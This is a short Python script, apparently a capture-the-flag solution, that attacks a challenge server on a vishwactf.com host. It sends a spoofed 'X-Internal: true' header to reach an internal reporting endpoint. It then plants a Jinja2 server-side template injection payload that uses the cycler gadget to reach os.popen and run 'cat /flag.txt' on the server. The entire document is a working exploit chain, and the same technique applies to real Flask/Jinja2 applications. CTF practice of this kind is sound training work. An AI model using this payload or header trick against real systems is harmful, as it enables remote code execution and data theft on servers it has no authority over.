import requests

BASE = "https://ghost-p.vishwactf.com"
HEADERS = {"Content-Type": "application/json", "X-Internal": "true"}

def inject(rid, payload):
    requests.post(f"{BASE}/api/report", headers=HEADERS, json={"report_id": rid, "content": payload})
    return requests.get(f"{BASE}/dashboard", params={"report_id": rid}).text

# SSTI -> RCE via Jinja2 cycler gadget
print(inject("pwn", '{{cycler.__init__.__globals__.os.popen("cat /flag.txt").read()}}'))
